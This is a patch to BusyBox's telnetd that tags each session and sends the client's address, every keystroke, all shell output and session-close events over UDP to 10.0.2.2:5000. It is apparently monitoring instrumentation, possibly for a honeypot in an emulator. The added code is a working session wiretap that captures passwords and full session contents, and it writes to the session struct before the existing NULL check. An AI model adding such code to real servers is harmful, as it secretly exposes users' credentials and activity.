@@ -1,0 +1,100 @@
+--- telnetd.c.bak	2019-03-22 01:25:36.634920211 +0000
++++ telnetd.c	2019-03-22 05:55:32.000000000 +0000
+@@ -142,6 +142,7 @@
+ #define TS_BUF2(ts) (((unsigned char*)(ts + 1)) + BUFSIZE)
+ 	int rdidx1, wridx1, size1;
+ 	int rdidx2, wridx2, size2;
++	unsigned char sid[16];
+ };
+ 
+ /* Two buffers are directly after tsession in malloced memory.
+@@ -163,6 +164,25 @@
+ 	G.issuefile = "/etc/issue.net"; \
+ } while (0)
+ 
++static unsigned char *create_buffer_and_fill_session_id(const unsigned char *sid, int extra_length) {
++	unsigned char *buf = malloc(2 + 16 + extra_length);
++	buf[0] = 0;
++	memcpy(buf + 2, sid, 16);
++	return buf;
++}
++
++static void report_data(const unsigned char *data, int len) {
++	struct sockaddr_in addr;
++	int s = socket(AF_INET, SOCK_DGRAM, 0);
++	addr.sin_family = AF_INET;
++	addr.sin_port = htons(5000);
++	addr.sin_addr.s_addr = inet_addr("10.0.2.2");
++	sendto(s, data, len, 0, (struct sockaddr *) &addr, sizeof(addr));
++	for (int i = 0; i < len; ++i) {
++		printf("%02X", data[i]);
++	}
++	printf("\n");
++}
+ 
+ /* Write some buf1 data to pty, processing IACs.
+  * Update wridx1 and size1. Return < 0 on error.
+@@ -651,6 +671,7 @@
+ 	int sec_linger = sec_linger;
+ 	char *opt_bindaddr = NULL;
+ 	char *opt_portnbr;
++	unsigned char *buf;
+ #else
+ 	enum {
+ 		IS_INETD = 1,
+@@ -798,6 +819,20 @@
+ 
+ 		/* Create a new session and link it into active list */
+ 		new_ts = make_new_session(fd);
++		srand(time(NULL));
++		for (int i = 0; i != 16; ++i) {
++			new_ts->sid[i] = rand() % 256;
++		}
++		buf = create_buffer_and_fill_session_id(new_ts->sid, 6);
++		struct sockaddr_in remote;
++		socklen_t addrlen = sizeof(remote);
++		getpeername(fd, (struct sockaddr *)&remote, &addrlen);
++		buf[1] = 0x00;
++		memcpy(buf + 18, (const void *)&remote.sin_addr.s_addr, 4);
++		memcpy(buf + 22, (const void *)&remote.sin_port, 2);
++		report_data(buf, 24);
++		free(buf);
++
+ 		if (new_ts) {
+ 			new_ts->next = G.sessions;
+ 			G.sessions = new_ts;
+@@ -859,6 +894,11 @@
+ 			ts->rdidx1 += count;
+ 			if (ts->rdidx1 >= BUFSIZE) /* actually == BUFSIZE */
+ 				ts->rdidx1 = 0;
++			buf = create_buffer_and_fill_session_id(ts->sid, count);
++			buf[1] = 0x04;
++			memcpy(buf + 18, TS_BUF1(ts), count);
++			report_data(buf, 18 + count);
++			free(buf);
+ 		}
+  skip3:
+ 		if (/*ts->size2 < BUFSIZE &&*/ FD_ISSET(ts->ptyfd, &rdfdset)) {
+@@ -874,6 +914,11 @@
+ 			ts->rdidx2 += count;
+ 			if (ts->rdidx2 >= BUFSIZE) /* actually == BUFSIZE */
+ 				ts->rdidx2 = 0;
++			buf = create_buffer_and_fill_session_id(ts->sid, count);
++			buf[1] = 0x04;
++			memcpy(buf + 18, TS_BUF2(ts), count);
++			report_data(buf, 18 + count);
++			free(buf);
+ 		}
+  skip4:
+ 		ts = next;
+@@ -881,6 +926,10 @@
+  kill_session:
+ 		if (ts->shell_pid > 0)
+ 			update_utmp_DEAD_PROCESS(ts->shell_pid);
++		buf = create_buffer_and_fill_session_id(ts->sid, 0);
++		buf[1] = 0x05;
++		report_data(buf, 18);
++		free(buf);
+ 		free_session(ts);
+ 		ts = next;
+ 	}
